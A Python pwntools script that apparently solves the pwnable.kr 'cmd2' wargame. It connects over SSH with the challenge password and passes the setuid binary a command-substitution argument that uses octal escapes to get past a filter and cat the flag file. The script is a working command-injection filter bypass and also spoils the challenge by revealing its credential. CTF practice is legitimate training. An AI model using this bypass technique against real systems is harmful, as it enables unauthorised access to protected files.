"""
Again here we have a bypass of rules in binary.
\57 is interpreted as '/' and separate the word 'flag'
"""
from pwn import *


def exploit():
    s = ssh(user='cmd2', host='pwnable.kr', password='mommy now I get what PATH environment is for :)', port=2222)
    # Command to execute on server
    cmd = """~/cmd2 '$(echo \"\\57bin\\57cat \\57home\\57cmd2\\57fla\")g'"""
    p = s.process(cmd, shell=True)
    print(p.recvall().decode('utf-8'))


if __name__=='__main__':
    exploit()
